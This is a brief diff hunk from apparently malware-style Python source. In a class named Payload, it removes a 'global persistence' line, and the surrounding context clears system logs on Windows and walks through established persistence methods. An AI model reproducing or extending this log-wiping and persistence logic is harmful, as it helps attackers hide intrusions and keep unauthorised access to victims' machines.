@@ -1767,7 +1767,6 @@ class Payload():
             if os.name == 'nt':
                 clear_system_logs()
             if 'persistence' in globals():
-                global persistence
                 for method in persistence.methods:
                     if persistence.methods[method].get('established'):
                         try:
